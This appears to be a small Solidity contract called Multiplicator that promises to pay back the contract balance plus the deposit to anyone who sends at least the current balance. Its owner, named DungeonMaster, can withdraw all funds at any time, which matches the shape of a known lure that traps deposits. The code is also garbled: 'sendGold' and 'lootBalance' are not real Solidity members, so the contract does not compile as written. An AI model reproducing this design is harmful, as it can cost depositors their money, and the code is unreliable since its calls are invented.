pragma solidity ^0.4.18;

contract Multiplicator
{
    address public DungeonMaster = msg.sender;

    function()payable{}

    function retrieveItems()
    payable
    public
    {
        require(msg.sender == DungeonMaster);
        DungeonMaster.sendGold(this.lootBalance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.lootBalance)
        {
            adr.sendGold(this.lootBalance+msg.value);
        }
    }
}